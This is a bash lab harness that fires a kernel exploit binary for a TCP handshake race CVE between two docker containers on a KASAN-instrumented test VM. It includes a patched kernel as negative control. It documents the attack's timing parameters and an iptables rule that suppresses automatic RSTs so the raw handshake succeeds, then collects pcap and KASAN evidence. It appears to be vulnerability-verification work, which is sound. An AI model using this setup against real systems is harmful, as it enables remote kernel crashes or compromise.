#!/bin/bash
# ============================================================================
# One-shot lab FIRE for CVE-2026-98432, tool v0.3.0, mode "handshake"
# (fire #2). Runs on debian12-lab (Proxmox VM), as labuser.
#
# Prereq: VM booted into the KASAN kernel (6.1.189 = hit run,
#         6.1.190 = negative control), docker running, ~/lab/ contains the
#         cve2026-98432-exp v0.3.0 binary + attack-hs.toml.
#
# Usage:
#   bash ~/lab/lab-fire.sh 189              # hit run (120 s, full sweep)
#   CALIB=1 bash ~/lab/lab-fire.sh 189      # calibration (20 s, small pcap)
#   HS_CPUS=0,1 bash ~/lab/lab-fire.sh 189  # different vCPU pair
#   HS_DELTA=2 HS_SWEEP=0,2,4 bash ~/lab/lab-fire.sh 189
#
# Env overrides:
#   $1           kernel tag for artifact naming        (default 189)
#   CALIB        1 = calibration profile (20 s, 200k pkt cap)
#   HS_CPUS      "rtx,ack" vCPU pair                  (default 1,2)
#   HS_DELTA     fixed delta_ack_us; empty = TOML value
#   HS_SWEEP     per-round sweep list; empty = TOML value
#   HS_GAP       fixed rst_gap_us (retransmit -> RST delay); empty = TOML value
#   HS_DURATION  run seconds                          (default 120; CALIB: 20)
#   HS_TOml      config file inside the containers    (default attack-hs.toml)
#
# Topology: docker bridge. listener (172.17.0.2) runs the Go listener
# (--listen 9000, accept+hold until OUR RST); sender (172.17.0.3) runs the
# handshake attack. The busybox-nc listener from fire #1 is GONE.
#
# Does NOT reboot. Removes only listener/sender containers (at start).
# ============================================================================
set -uo pipefail

KTAG="${1:-189}"
CALIB="${CALIB:-0}"
HS_CPUS="${HS_CPUS:-1,2}"
HS_DELTA="${HS_DELTA:-}"
HS_SWEEP="${HS_SWEEP:-}"
HS_GAP="${HS_GAP:-}"
HS_TOML="${HS_TOML:-attack-hs.toml}"
HS_DURATION="${HS_DURATION:-120}"
[ "$CALIB" = "1" ] && HS_DURATION=20
# Lab port (listener --listen $HS_PORT; must match attack-hs.toml target.port).
HS_PORT=9000
TCPDUMP_CAP=4000000
[ "$CALIB" = "1" ] && TCPDUMP_CAP=200000

TS=$(date +%s)
ART=~/lab/artifacts-hs-${KTAG}-${TS}
mkdir -p "$ART"
echo "Artifacts: $ART"
[ "$CALIB" = "1" ] && echo "PROFILE: CALIBRATION (short run, small pcap)"

echo "=== [0/7] host info ==="
{
  echo "uname: $(uname -r)"
  echo "cmdline: $(cat /proc/cmdline)"
  echo "nproc: $(nproc)"
  echo "processors: $(grep -c ^processor /proc/cpuinfo)"
  echo "exp-version: $(~/lab/cve2026-98432-exp --version 2>/dev/null || echo 'binary missing?')"
  echo "kasan-syms: $(grep -c kasan /proc/kallsyms 2>/dev/null)"
  echo "--- rps (empty = no RPS steering, packet stays on the CPU that sent it)"
  for dev in $(ls /sys/class/net 2>/dev/null | grep -E '^(docker0|veth)'); do
    echo "$dev rps_cpus=$(cat /sys/class/net/$dev/queues/rx-0/rps_cpus 2>/dev/null)"
  done
  echo "--- sysctls"
  for k in net.ipv4.conf.all.accept_source_route \
           net.ipv4.conf.default.accept_source_route \
           net.ipv4.ip_forward \
           net.core.netdev_max_backlog; do
    echo "$k=$(sysctl -n "$k" 2>/dev/null)"
  done
} > "$ART/env.txt" 2>&1
cat "$ART/env.txt"
NPROC=$(nproc)
if [ "$NPROC" -lt 3 ]; then
  echo "WARN: nproc=$NPROC < 3 — HS_CPUS=${HS_CPUS} may be out of range (need 2 send CPUs + 1 coordinator)"
fi

echo "=== [1/7] containers ==="
sudo docker rm -f listener sender >/dev/null 2>&1 || true
sudo docker pull -q alpine:latest >/dev/null 2>&1 || sudo docker pull alpine:latest
# listener: Go accept+hold endpoint (NOT busybox nc — it must hold the
# kernel-created child until OUR RST closes it in-kernel).
sudo docker run -d --name listener -v /home/labuser/lab:/lab:ro alpine:latest \
  sh -c 'cp /lab/cve2026-98432-exp /tmp/exp && chmod +x /tmp/exp && exec /tmp/exp --listen 9000'
sleep 2
sudo docker run -d --name sender --cap-add NET_RAW -v /home/labuser/lab:/lab:ro alpine:latest \
  sh -c 'cp /lab/cve2026-98432-exp /tmp/exp && chmod +x /tmp/exp && sleep infinity'
LIP=$(sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' listener)
SIP=$(sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' sender)
echo "listener=${LIP} sender=${SIP}"
[ "$LIP" != "172.17.0.2" ] && echo "WARN: listener is not 172.17.0.2 — check ${HS_TOML} target.ip"
sleep 1
sudo docker logs listener > "$ART/listener-start.log" 2>&1
grep -q "accepting and holding" "$ART/listener-start.log" \
  && echo "listener: up (accepting on ${HS_PORT})" \
  || { echo "LISTENER FAILED:"; cat "$ART/listener-start.log"; exit 1; }

echo "=== [1b/7] auto-RST filter (sender netns egress) ==="
# A raw-injected SYN creates NO kernel socket on the SENDER side, so the
# sender kernel receives the listener's SYN-ACK with no matching socket
# and replies with an auto-RST (RST set, ACK clear). That auto-RST loops
# back to the listener and embryonic_reset's the request socket BEFORE
# our completing ACK arrives -> the child is never created and every
# round is a miss. Drop exactly those auto-RSTs on the sender's egress
# (iptables in the sender's netns via nsenter; the kernel 'tcp' match is
# built-in). Our closing RST carries ACK (ack=ISN2+1) and passes.
SPID=$(sudo docker inspect -f '{{.State.Pid}}' sender)
if sudo nsenter -t "$SPID" -n iptables -C OUTPUT -p tcp --dport "$HS_PORT" \
    --tcp-flags RST,ACK RST -j DROP 2>/dev/null; then
  echo "auto-RST filter: already present"
else
  sudo nsenter -t "$SPID" -n iptables -A OUTPUT -p tcp --dport "$HS_PORT" \
    --tcp-flags RST,ACK RST -j DROP && echo "auto-RST filter: added"
fi
echo "sender OUTPUT chain (drop RST[!ACK] to :${HS_PORT}):"
sudo nsenter -t "$SPID" -n iptables -L OUTPUT -n 2>/dev/null | sed 's/^/    /' || true

echo "=== [2/7] pcap on docker0 (host side) ==="
sudo timeout $((HS_DURATION + 30)) tcpdump -i docker0 -w "$ART/attack.pcap" -c "$TCPDUMP_CAP" &
TPID=$!
sleep 1

echo "=== [3/7] sanity ==="
sudo docker exec sender /tmp/exp --version
# Note: a missing toml silently falls back to the tool defaults, so
# verify the dry-run actually rendered the handshake mode.
if ! sudo docker exec sender /tmp/exp --dry-run --config /lab/"$HS_TOML" > "$ART/dryrun.txt" 2>&1; then
  echo "DRY-RUN FAILED:"; cat "$ART/dryrun.txt"; kill $TPID 2>/dev/null; exit 1
fi
grep -q "Per-round timeline" "$ART/dryrun.txt" \
  || { echo "DRY-RUN is not handshake mode (bad config?) — see $ART/dryrun.txt"; kill $TPID 2>/dev/null; exit 1; }
grep -q "dst=${LIP}:9000" "$ART/dryrun.txt" \
  || echo "WARN: dry-run target is not ${LIP}:9000 — check ${HS_TOML}"
head -15 "$ART/dryrun.txt"

echo "=== [3b/7] dmesg baseline (attribution: only NEW lines count) ==="
sudo dmesg > "$ART/dmesg-baseline.txt"

echo "=== [4/7] FIRE handshake (${HS_DURATION}s, cpus=${HS_CPUS}) ==="
EXTRA=""
[ -n "$HS_CPUS" ] && EXTRA="$EXTRA --cpus $HS_CPUS"
[ -n "$HS_DELTA" ] && EXTRA="$EXTRA --delta-ack-us $HS_DELTA"
[ -n "$HS_SWEEP" ] && EXTRA="$EXTRA --sweep $HS_SWEEP"
[ -n "$HS_GAP" ] && EXTRA="$EXTRA --rst-gap-us $HS_GAP"
date -u +"start: %F %T UTC"
timeout $((HS_DURATION + 60)) sudo docker exec sender /tmp/exp \
  --cli --config /lab/"$HS_TOML" --duration "$HS_DURATION" $EXTRA 2>&1 | tee "$ART/stdout.log"
echo "attack rc=$?"
date -u +"end:   %F %T UTC"

echo "=== [5/7] harvest ==="
wait $TPID 2>/dev/null
# Best-effort removal of the auto-RST filter (it also dies with the sender
# container's netns, but tidy up explicitly).
SPID=$(sudo docker inspect -f '{{.State.Pid}}' sender 2>/dev/null) || SPID=""
if [ -n "$SPID" ] && sudo nsenter -t "$SPID" -n iptables -D OUTPUT -p tcp \
    --dport "$HS_PORT" --tcp-flags RST,ACK RST -j DROP 2>/dev/null; then
  echo "auto-RST filter: removed"
fi
sudo dmesg > "$ART/dmesg.txt"
# Only lines that appeared during the run (baseline diff).
diff "$ART/dmesg-baseline.txt" "$ART/dmesg.txt" | grep '^>' | sed 's/^> //' > "$ART/dmesg-new.txt" || true
grep -nE "BUG: KASAN|use-after-free|KASAN|general protection|Kernel panic" "$ART/dmesg-new.txt" > "$ART/hits.txt"
[ -s "$ART/hits.txt" ] && echo "HITS FOUND (new dmesg lines — see hits.txt)" \
                        || echo "no NEW KASAN/panic lines in dmesg"
sudo docker stop -t 3 listener >/dev/null 2>&1   # SIGTERM -> final counters line
sudo docker logs listener > "$ART/listener.log" 2>&1
sudo docker inspect listener sender > "$ART/docker-inspect.json" 2>&1
cp ~/lab/"$HS_TOML" "$ART/config-used.toml" 2>/dev/null || true

echo "=== [6/7] verdict ==="
{
  echo "kernel: $(uname -r)"
  echo "kasan:  $(grep -ci kasan /proc/kallsyms)"
  echo "hits:"
  cat "$ART/hits.txt" 2>/dev/null || echo "(none)"
  echo ""
  echo "listener final (accepted = handshakes completed, released = our RST reset the children):"
  tail -4 "$ART/listener.log"
  echo ""
  echo "engine final:"
  tail -3 "$ART/stdout.log"
}
[ -s "$ART/hits.txt" ] && echo ">>> HIT: KASAN/panic present — collect the full report below" \
                       || echo ">>> MISS: no kernel reports"
[ -s "$ART/hits.txt" ] && grep -n -A 30 "BUG: KASAN" "$ART/dmesg.txt" | head -80 > "$ART/report.txt"

echo "=== [7/7] list ==="
ls -lh "$ART"
echo "=== FIRE DONE: $ART ==="
